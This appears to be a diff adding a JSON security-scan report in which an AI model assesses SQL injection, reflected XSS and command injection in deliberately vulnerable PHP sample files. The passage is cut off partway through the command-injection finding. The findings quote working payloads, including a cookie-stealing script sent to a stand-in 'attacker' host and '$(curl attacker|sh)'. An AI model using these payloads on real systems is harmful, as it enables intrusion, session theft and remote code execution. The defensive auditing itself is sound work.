@@ -1,0 +1,1637 @@
+{
+  "application_version": "0.2.0",
+  "scan_metadata": {
+    "commit": "3beee0f6219cd49e29a3d9e27e3a5dceb21245fe",
+    "target": "local",
+    "status": "completed",
+    "gate": "failed",
+    "errors": [],
+    "configuration": {
+      "schema_version": 1,
+      "profile": "fast",
+      "fail_on": "high",
+      "output_dir": "d:\\New folder\\DevSecOps-Agent\\evidence\\8-scenarios-ai-full-2026-11-25\\KB4",
+      "timezone": "Asia/Saigon",
+      "timeout": 600,
+      "max_files": 100000,
+      "allow_dirty": true,
+      "ci": false,
+      "laya": false,
+      "laya_config_path": null,
+      "ai_review": true,
+      "provider_profile": "kojo-bench-tmp",
+      "provider_model": "empero/kojo",
+      "ai_report": true,
+      "max_ai_findings": 10,
+      "max_model_requests": null,
+      "mode": "hunt",
+      "tools": [
+        "native-hunt"
+      ]
+    }
+  },
+  "run_id": "run-1580e0037fac4a13944363313403b149",
+  "generated_at": "2026-11-25T13:42:50.946704+00:00",
+  "counts": {
+    "version": "0.1.0",
+    "total": 9,
+    "confirmed": 0,
+    "rejected": 0,
+    "unresolved": 9,
+    "unprocessed": 0
+  },
+  "coverage_summary": {
+    "owasp-dependency-check": [],
+    "semgrep": [],
+    "gitleaks": []
+  },
+  "owasp_top10": {
+    "edition": "2025",
+    "source_url": "https://top10.owasp.org/2025/",
+    "snapshot_date": "2026-11-04",
+    "classification_only": true,
+    "mapping_basis": "Exact normalized primary/secondary CWEs in OWASP category-specific mapped-CWE lists",
+    "note": "This is a CWE classification of reported findings, not a coverage or compliance assessment. An empty category means No mapped findings reported; it does not mean tested, safe or passed. Counts retain finding status; pending includes unprocessed, triaged, assessed and pending validation. A finding with multiple labels may appear in several rows/categories; do not add those row counts.",
+    "total_findings": 9,
+    "categories": [
+      {
+        "id": "A01:2025",
+        "name": "Broken Access Control",
+        "source_url": "https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/",
+        "source_sha256": "e51ca05866f4213489e82484f1f48ed4d779e1809e87f70449806b496a0320cd",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A02:2025",
+        "name": "Security Misconfiguration",
+        "source_url": "https://top10.owasp.org/2025/A02_2025-Security_Misconfiguration/",
+        "source_sha256": "532fbbd67f3db734b7ed5d47e0263dd3800fce80e22da327123a88f2947017c9",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A03:2025",
+        "name": "Software Supply Chain Failures",
+        "source_url": "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/",
+        "source_sha256": "66090225ad8f54a836e5b9e94456243baa7d38b70176f4d720668ef36f3a793d",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A04:2025",
+        "name": "Cryptographic Failures",
+        "source_url": "https://top10.owasp.org/2025/A04_2025-Cryptographic_Failures/",
+        "source_sha256": "5b140b4cadf334becc35334278494f98396dc9b5720df6c904688352b51dc834",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A05:2025",
+        "name": "Injection",
+        "source_url": "https://top10.owasp.org/2025/A05_2025-Injection/",
+        "source_sha256": "69d7ec591944699c49b89c544a52cb32adccbfad56c41784ca34fde837822de6",
+        "total": 6,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 6
+        },
+        "finding_ids": [
+          "model-8abfaa82d10be0db",
+          "model-8dba793fe2e803f6",
+          "model-a2fd9086db8a6354",
+          "model-a48bdbb0ebc0c939",
+          "model-cfe59861d98f28c2",
+          "model-ed0a142e6393612e"
+        ],
+        "cwes": [
+          {
+            "cwe": "CWE-78",
+            "total": 2,
+            "status_counts": {
+              "unprocessed": 0,
+              "triaged": 0,
+              "assessed": 0,
+              "pending_validation": 0,
+              "confirmed": 0,
+              "rejected": 0,
+              "unresolved": 2
+            },
+            "finding_ids": [
+              "model-8dba793fe2e803f6",
+              "model-cfe59861d98f28c2"
+            ]
+          },
+          {
+            "cwe": "CWE-79",
+            "total": 2,
+            "status_counts": {
+              "unprocessed": 0,
+              "triaged": 0,
+              "assessed": 0,
+              "pending_validation": 0,
+              "confirmed": 0,
+              "rejected": 0,
+              "unresolved": 2
+            },
+            "finding_ids": [
+              "model-a48bdbb0ebc0c939",
+              "model-ed0a142e6393612e"
+            ]
+          },
+          {
+            "cwe": "CWE-89",
+            "total": 2,
+            "status_counts": {
+              "unprocessed": 0,
+              "triaged": 0,
+              "assessed": 0,
+              "pending_validation": 0,
+              "confirmed": 0,
+              "rejected": 0,
+              "unresolved": 2
+            },
+            "finding_ids": [
+              "model-8abfaa82d10be0db",
+              "model-a2fd9086db8a6354"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "A06:2025",
+        "name": "Insecure Design",
+        "source_url": "https://top10.owasp.org/2025/A06_2025-Insecure_Design/",
+        "source_sha256": "cf67ac90b3c088ca4566807fbc4bbd2090bccc81d61f15c0e25190032618195f",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A07:2025",
+        "name": "Authentication Failures",
+        "source_url": "https://top10.owasp.org/2025/A07_2025-Authentication_Failures/",
+        "source_sha256": "9decccf146242740ba34b1c14df7b729ef159274a3533182c6bcefc9f52c8816",
+        "total": 1,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 1
+        },
+        "finding_ids": [
+          "model-7230607c40e80064"
+        ],
+        "cwes": [
+          {
+            "cwe": "CWE-798",
+            "total": 1,
+            "status_counts": {
+              "unprocessed": 0,
+              "triaged": 0,
+              "assessed": 0,
+              "pending_validation": 0,
+              "confirmed": 0,
+              "rejected": 0,
+              "unresolved": 1
+            },
+            "finding_ids": [
+              "model-7230607c40e80064"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "A08:2025",
+        "name": "Software or Data Integrity Failures",
+        "source_url": "https://top10.owasp.org/2025/A08_2025-Software_or_Data_Integrity_Failures/",
+        "source_sha256": "03082e5a3ce031d6d2425927653aca0ad47d474dafb4208862e86b4363d66d85",
+        "total": 2,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 2
+        },
+        "finding_ids": [
+          "model-26bbeb61ecc17524",
+          "model-85029b008e0bf398"
+        ],
+        "cwes": [
+          {
+            "cwe": "CWE-502",
+            "total": 2,
+            "status_counts": {
+              "unprocessed": 0,
+              "triaged": 0,
+              "assessed": 0,
+              "pending_validation": 0,
+              "confirmed": 0,
+              "rejected": 0,
+              "unresolved": 2
+            },
+            "finding_ids": [
+              "model-26bbeb61ecc17524",
+              "model-85029b008e0bf398"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "A09:2025",
+        "name": "Security Logging & Alerting Failures",
+        "source_url": "https://top10.owasp.org/2025/A09_2025-Security_Logging_and_Alerting_Failures/",
+        "source_sha256": "e8f875d2db062bfd3eb00db65486b30dd64c417357f9346a395cf434b5055f31",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A10:2025",
+        "name": "Mishandling of Exceptional Conditions",
+        "source_url": "https://top10.owasp.org/2025/A10_2025-Mishandling_of_Exceptional_Conditions/",
+        "source_sha256": "492a7444a58c06ec76af06ed4f89e656804cde6b71f61ba2ed5703a9aa343864",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      }
+    ],
+    "unmapped": []
+  },
+  "findings": [
+    {
+      "version": "0.1.0",
+      "finding_id": "model-8abfaa82d10be0db",
+      "run_id": "run-1580e0037fac4a13944363313403b149",
+      "fingerprint": "8abfaa82d10be0db499669aba6a83385bd8b9ef513d6584c9ad4300b1128f93a",
+      "title": "SQL injection via unsanitized GET parameter concatenated into mysqli_query",
+      "description": "$_GET['q'] is read at line 2 and concatenated directly into the SQL string passed to mysqli_query at line 3, inside a single-quoted literal. No escaping, casting, or prepared statement is used. A payload such as ?q=' OR '1'='1 or ?q=' UNION SELECT username,password FROM users-- - breaks out of the quote and lets an attacker read or modify arbitrary tables, and stacked/extracted queries permit authentication bypass. Remotely reachable with no authentication or preconditions.",
+      "cwe_category": "CWE-89",
+      "additional_cwe_labels": [],
+      "severity": "critical",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-8abfaa82d10be0db-obs",
+          "run_id": "run-1580e0037fac4a13944363313403b149",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-89",
+          "severity": "critical",
+          "native_severity": null,
+          "message": "$_GET['q'] is read at line 2 and concatenated directly into the SQL string passed to mysqli_query at line 3, inside a single-quoted literal. No escaping, casting, or prepared statement is used. A payload such as ?q=' OR '1'='1 or ?q=' UNION SELECT username,password FROM users-- - breaks out of the quote and lets an attacker read or modify arbitrary tables, and stacked/extracted queries permit authentication bypass. Remotely reachable with no authentication or preconditions.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "web/vuln_sql.php",
+            "language": "php",
+            "line_start": 3,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- web/vuln_sql.php (lines 1-4) ---\n1: <?php\n2: $q = $_GET['q'];\n3: $res = mysqli_query($conn, \"SELECT * FROM products WHERE name = '\" . $q . \"'\");\n4: ?>"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:40:24.312496Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-8abfaa82d10be0db-obs"
+      ],
+      "created_at": "2026-11-25T13:40:24.312496Z",
+      "updated_at": "2026-11-25T13:40:24.312496Z",
+      "metadata": {
+        "title": "SQL injection via unsanitized GET parameter concatenated into mysqli_query",
+        "rationale": "$_GET['q'] is read at line 2 and concatenated directly into the SQL string passed to mysqli_query at line 3, inside a single-quoted literal. No escaping, casting, or prepared statement is used. A payload such as ?q=' OR '1'='1 or ?q=' UNION SELECT username,password FROM users-- - breaks out of the quote and lets an attacker read or modify arbitrary tables, and stacked/extracted queries permit authentication bypass. Remotely reachable with no authentication or preconditions.",
+        "evidence": "$q = $_GET['q'];\n$res = mysqli_query($conn, \"SELECT * FROM products WHERE name = '\" . $q . \"'\");",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-8abfaa82d10be0db",
+          "finding_id": "model-8abfaa82d10be0db",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-8abfaa82d10be0db-model-8abfaa82d10be0db-obs",
+            "ev-model-8abfaa82d10be0db-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:42:26.996397Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "assessment_id": "assess-model-8abfaa82d10be0db-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-8abfaa82d10be0db-model-8abfaa82d10be0db-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-8abfaa82d10be0db-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-8abfaa82d10be0db-ai",
+            "finding_id": "model-8abfaa82d10be0db",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": {
+              "version": "4.0",
+              "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+              "base_score": 9.3,
+              "qualitative": "critical",
+              "source": "ai-proposal",
+              "notes": "",
+              "overall_score": 9.3,
+              "base_rating": "Critical",
+              "overall_rating": "Critical",
+              "nomenclature": "CVSS-B",
+              "calculation_source": "FIRST CVSS v4.0",
+              "metric_assumptions_verified": false
+            },
+            "confidence": 0.5,
+            "assumptions": [
+              "web/vuln_sql.php is served as a PHP endpoint under a web root (it reads $_GET); no router, .htaccess, or web.xml exists in the 8-file snapshot to confirm the URL or any auth gate.",
+              "The $conn handle is supplied by a bootstrap not present in the snapshot; no mysqli_connect/new mysqli/include/require appears in any *.php file.",
+              "Impact is bounded by the database account's privileges; the grants of $conn are unknown.",
+              "The scanner's stacked-query claim is NOT established: mysqli_query does not execute multiple statements by default, so '; DROP TABLE ...' style payloads are not proven.",
+              "The scanner's 'no authentication' statement is an inference from the absence of auth code, not a verified runtime property.",
+              "The CVSS vector is provisional; PR:N and AV:N rest on inferred deployment context rather than observed routing."
+            ],
+            "rationale": "# Assessment: model-8abfaa82d10be0db — SQL injection in `web/vuln_sql.php`\n\n## Verdict: confirmed as a code-level defect (inferred as exploitable, see caveats)\n\nThe source is exactly what the scanner described. I read the whole file (4 lines):\n\n```php\n1: <?php\n2: $q = $_GET['q'];\n3: $res = mysqli_query($conn, \"SELECT * FROM products WHERE name = '\" . $q . \"'\");\n4: ?>\n```\n\n`$_GET['q']` flows directly into a single-quoted SQL literal with no escaping, type cast, whitelist, or parameter binding. Line 4 closes the PHP tag with no output handling, so the script is a standalone request handler. The sibling `web/safe_sql.php` shows the intended secure pattern (PDO `prepare`/`execute` with a bound parameter), which confirms this file is the deliberately unsafe counterpart.\n\n**Exploitability.** Because `$q` is unquoted-concatenated inside `'...'`, the classic breakouts apply:\n- `?q=' OR '1'='1` → returns all rows (auth/authorization bypass in a query like this).\n- `?q=' UNION SELECT username,password FROM users-- -` → reads arbitrary tables via `mysqli_query`.\n- `?q='; DROP TABLE products-- -` → stacked statement, **only if** the driver executes multiple statements (mysqli does not by default; `mysqli_multi_query` would be required). The scanner's claim of \"stacked queries\" is therefore not established by the code I read.\n\n## Evidence status (what I actually checked vs. what I could not)\n\n| Item | Result |\n|---|---|\n| Source of sink | Read in full (`web/vuln_sql.php`, 4 lines) — confirmed |\n| Sibling secure pattern | Read (`web/safe_sql.php`, lines 1-4) — confirmed contrast |\n| Semgrep PHP rules | **Not run** — `semgrep not found on PATH` |\n| CodeQL PHP | **Not run** — tool reports PHP dataflow unsupported |\n| `$conn` origin / includes / auth wrapper | **Not found** — grep for `mysqli_connect`, `new mysqli`, `include`, `require`, `session_start`, `function` returned zero hits across all `*.php`; the snapshot contains only 8 files in `web/`, no bootstrap, config, or `.htacces",
+            "evidence_refs": [
+              "model-8abfaa82d10be0db-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-8abfaa82d10be0db",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:41:02.332113Z",
+            "metadata": {
+              "tool_calls_made": 10,
+              "total_tokens": 46544,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "computed"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-ed0a142e6393612e",
+      "run_id": "run-1580e0037fac4a13944363313403b149",
+      "fingerprint": "ed0a142e6393612e0fbf720b9c4e1f7c820026d2c02d97f8fe8c6f22430c928d",
+      "title": "Reflected XSS: raw GET parameter echoed into HTML response",
+      "description": "$_GET['msg'] is written into the response body with no output encoding or contextual escaping. A crafted link such as ?msg=<script>document.location='//attacker/?c='+document.cookie</script> executes attacker JavaScript in the victim's origin, enabling session theft, CSRF-token bypass, and phishing inside the trusted site. Exploitation requires the victim to follow a crafted URL.",
+      "cwe_category": "CWE-79",
+      "additional_cwe_labels": [],
+      "severity": "high",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-ed0a142e6393612e-obs",
+          "run_id": "run-1580e0037fac4a13944363313403b149",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-79",
+          "severity": "high",
+          "native_severity": null,
+          "message": "$_GET['msg'] is written into the response body with no output encoding or contextual escaping. A crafted link such as ?msg=<script>document.location='//attacker/?c='+document.cookie</script> executes attacker JavaScript in the victim's origin, enabling session theft, CSRF-token bypass, and phishing inside the trusted site. Exploitation requires the victim to follow a crafted URL.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "web/vuln_xss.php",
+            "language": "php",
+            "line_start": 2,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- web/vuln_xss.php (lines 1-3) ---\n1: <?php\n2: echo \"<div>\" . $_GET[\"msg\"] . \"</div>\";\n3: ?>"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:40:24.318012Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-ed0a142e6393612e-obs"
+      ],
+      "created_at": "2026-11-25T13:40:24.318012Z",
+      "updated_at": "2026-11-25T13:40:24.318012Z",
+      "metadata": {
+        "title": "Reflected XSS: raw GET parameter echoed into HTML response",
+        "rationale": "$_GET['msg'] is written into the response body with no output encoding or contextual escaping. A crafted link such as ?msg=<script>document.location='//attacker/?c='+document.cookie</script> executes attacker JavaScript in the victim's origin, enabling session theft, CSRF-token bypass, and phishing inside the trusted site. Exploitation requires the victim to follow a crafted URL.",
+        "evidence": "echo \"<div>\" . $_GET[\"msg\"] . \"</div>\";",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-ed0a142e6393612e",
+          "finding_id": "model-ed0a142e6393612e",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-ed0a142e6393612e-model-ed0a142e6393612e-obs",
+            "ev-model-ed0a142e6393612e-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:42:26.997376Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "assessment_id": "assess-model-ed0a142e6393612e-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-ed0a142e6393612e-model-ed0a142e6393612e-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-ed0a142e6393612e-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-ed0a142e6393612e-ai",
+            "finding_id": "model-ed0a142e6393612e",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": {
+              "version": "4.0",
+              "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+              "base_score": 5.3,
+              "qualitative": "medium",
+              "source": "ai-proposal",
+              "notes": "",
+              "overall_score": 5.3,
+              "base_rating": "Medium",
+              "overall_rating": "Medium",
+              "nomenclature": "CVSS-B",
+              "calculation_source": "FIRST CVSS v4.0",
+              "metric_assumptions_verified": false
+            },
+            "confidence": 0.5,
+            "assumptions": [
+              "The file is served by a PHP interpreter over HTTP as reachable web content; no server or deployment config exists in the snapshot to confirm or refute this.",
+              "Session cookie HttpOnly and SameSite attributes are unknown: the repository contains no session_start, setcookie, or Content-Security-Policy directives. The cookie-theft path is plausible but unproven; same-origin script execution and DOM manipulation are proven regardless.",
+              "Reflected-only exploitation: the attacker must induce a victim to visit a crafted URL. No stored or DOM-based variant is present in this file.",
+              "Duplicate finding model-a48bdbb0ebc0c939 describes the same sink in the same file and should be merged rather than counted separately.",
+              "The web/ directory resembles a deliberately vulnerable training corpus (paired safe_*/vuln_* files); exploitability in production depends on whether this tree is deployed, which I could not determine."
+            ],
+            "rationale": "## Assessment\n\n**Confirmed in source.** `web/vuln_xss.php` is 3 lines total:\n\n```php\n<?php\necho \"<div>\" . $_GET[\"msg\"] . \"</div>\";\n?>\n```\n\nThe taint flow is direct and complete: source `$_GET[\"msg\"]` → sink `echo` into the response body, with no `htmlspecialchars()`, `strip_tags()`, or any other escaping between them. The payload lands in an HTML text-node context inside a `<div>`, where `<script>` and event-handler payloads execute normally. The scanner's example payload (`?msg=<script>…</script>`) is valid for this context.\n\n**Contrast with the intended-safe sibling** confirms the defect is the missing encoding rather than a scanner misread. `web/safe_xss.php` is byte-for-byte the same except for `htmlspecialchars($_GET[\"msg\"], ENT_QUOTES, \"UTF-8\")`. The two files differ only in the escaping call, which is exactly the CWE-79 discriminator.\n\n**Tool corroboration is limited, and I want to be explicit about that.** Semgrep failed (`semgrep not found on PATH`) and CodeQL declined PHP (`CodeQL does not natively support PHP dataflow`). `check_coverage` for CWE-79 returned an empty object, so I cannot report analysis coverage for this language. My confidence rests on the direct source read, not on scanner agreement. A second model-hunt observation (`model-a48bdbb0ebc0c939`) flags the same file but self-describes as unconfirmed and places the sink at line 1; its own snippet contradicts that, showing the echo on line 2. I treat it as the same underlying issue, not an independent corroboration.\n\n**Severity reasoning.** Exploitation requires a victim to follow a crafted link (UI:Passive), and the attacker needs no privileges and no prior knowledge of the target (PR:N, AT:N). The attacker-supplied script runs in the site's origin, so it can read `document.cookie` and make same-origin authenticated requests. That gives both confidentiality and integrity impact on the vulnerable system. The finding's claim about session theft is contingent on cookies being reachable from JavaSc",
+            "evidence_refs": [
+              "model-ed0a142e6393612e-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-ed0a142e6393612e",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:41:00.366940Z",
+            "metadata": {
+              "tool_calls_made": 12,
+              "total_tokens": 50592,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "computed"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-8dba793fe2e803f6",
+      "run_id": "run-1580e0037fac4a13944363313403b149",
+      "fingerprint": "8dba793fe2e803f6e2acfdf67ef92be2401734b29a2e03b8fc3d88cde8bdfc80",
+      "title": "OS command injection via GET parameter passed to shell_exec",
+      "description": "$_GET['host'] is interpolated into a shell command string handed to shell_exec without escapeshellarg() or validation. Shell metacharacters let the attacker chain arbitrary commands, e.g. ?host=127.0.0.1;id or ?host=$(curl attacker|sh). The command output is echoed back, giving a full non-interactive remote shell as the web server user, which typically leads to complete host compromise.",
+      "cwe_category": "CWE-78",
+      "additional_cwe_labels": [],
+      "severity": "critical",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-8dba793fe2e803f6-obs",
+          "run_id": "run-1580e0037fac4a13944363313403b149",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-78",
+          "severity": "critical",
+          "native_severity": null,
+          "message": "$_GET['host'] is interpolated into a shell command string handed to shell_exec without escapeshellarg() or validation. Shell metacharacters let the attacker chain arbitrary commands, e.g. ?host=127.0.0.1;id or ?host=$(curl attacker|sh). The command output is echoed back, giving a full non-interactive remote shell as the web server user, which typically leads to complete host compromise.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "web/vuln_cmd.php",
+            "language": "php",
+            "line_start": 3,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- web/vuln_cmd.php (lines 1-4) ---\n1: <?php\n2: $host = $_GET['host'];\n3: echo shell_exec(\"ping -c 1 \" . $host);\n4: ?>"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:40:24.319011Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-8dba793fe2e803f6-obs"
+      ],
+      "created_at": "2026-11-25T13:40:24.319011Z",
+      "updated_at": "2026-11-25T13:40:24.319011Z",
+      "metadata": {
+        "title": "OS command injection via GET parameter passed to shell_exec",
+        "rationale": "$_GET['host'] is interpolated into a shell command string handed to shell_exec without escapeshellarg() or validation. Shell metacharacters let the attacker chain arbitrary commands, e.g. ?host=127.0.0.1;id or ?host=$(curl attacker|sh). The command output is echoed back, giving a full non-interactive remote shell as the web server user, which typically leads to complete host compromise.",
+        "evidence": "$host = $_GET['host'];\necho shell_exec(\"ping -c 1 \" . $host);",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-8dba793fe2e803f6",
+          "finding_id": "model-8dba793fe2e803f6",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-8dba793fe2e803f6-model-8dba793fe2e803f6-obs",
+            "ev-model-8dba793fe2e803f6-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:42:26.997376Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "assessment_id": "assess-model-8dba793fe2e803f6-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-8dba793fe2e803f6-model-8dba793fe2e803f6-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-8dba793fe2e803f6-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-8dba793fe2e803f6-ai",
+            "finding_id": "model-8dba793fe2e803f6",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": {
+              "version": "4.0",
+              "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+              "base_score": 10.0,
+              "qualitative": "critical",
+              "source": "ai-proposal",
+              "notes": "",
+              "overall_score": 10.0,
+              "base_rating": "Critical",
+              "overall_rating": "Critical",
+              "nomenclature": "CVSS-B",
+              "calculation_source": "FIRST CVSS v4.0",
+              "metric_assumptions_verified": false
+            },
+            "confidence": 0.95,
+            "assumptions": [
+              "The web root is served such that web/vuln_cmd.php is reachable over HTTP; deployment config is not in the snapshot.",
+              "No upstream WAF, reverse proxy filter, or PHP-level input rewriting blocks ';', '$()' or backticks (none is visible in the snapshot).",
+              "The process runs as an ordinary web server user; privilege level and container/OS hardening were not verified.",
+              "Semgrep could not run (not on PATH) and check_coverage returned no CWE-78 record, so no independent scanner corroboration exists for this finding.",
